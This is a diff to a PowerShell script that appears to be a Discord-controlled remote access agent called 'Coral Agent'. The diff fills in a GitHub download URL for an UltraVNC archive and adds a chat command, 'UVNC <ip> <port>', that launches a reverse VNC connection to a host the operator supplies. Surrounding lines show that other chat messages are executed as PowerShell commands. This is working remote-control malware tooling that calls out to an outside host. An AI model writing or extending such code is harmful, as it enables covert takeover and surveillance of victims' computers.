@@ -1167,8 +1167,6 @@ try {
 }
 # =============================================================== HELP MENU ========================================================================
 
-
-
 function display_help{
     $message = "
 :robot: **Coral Agent Help Menu:**
@@ -1214,8 +1212,8 @@ Function StartUvnc{
     sendMsg -Message "Set up UVNC Lister, IP: $ip, Port: $port"
     sendMsg -Message ":arrows_counterclockwise: ``Starting UVNC Client..`` :arrows_counterclockwise:"
     $tempFolder = "$env:temp\vnc"
-    $vncDownload = 
-    $vncZip = "$tempFolder\winvnc.zip" 
+    $vncDownload = "https://github.com/JoshuaBrien/Compilation-of-stuff-i-done/raw/refs/heads/main/Coral_network_discordONLY/assets/UltraVNC.zip"
+    $vncZip = "$tempFolder\UltraVNC.zip" 
     if (!(Test-Path -Path $tempFolder)) {
         New-Item -ItemType Directory -Path $tempFolder | Out-Null
     }  
@@ -1291,6 +1289,11 @@ while ($true) {
                 elseif ($latestMessage -match "^JOBSTATUS (.+)$") {
                     $jobName = $matches[1]
                     Get_AgentJobStatus -JobName $jobName
+                }
+                elseif ($latestMessage -match "^UVNC (.+) (.+)$") {
+                    $ip = $matches[1].Trim()
+                    $port = $matches[2].Trim()
+                    StartUvnc -ip $ip -port $port
                 }
                 else {
                     # Execute PowerShell commands with enhanced output handling
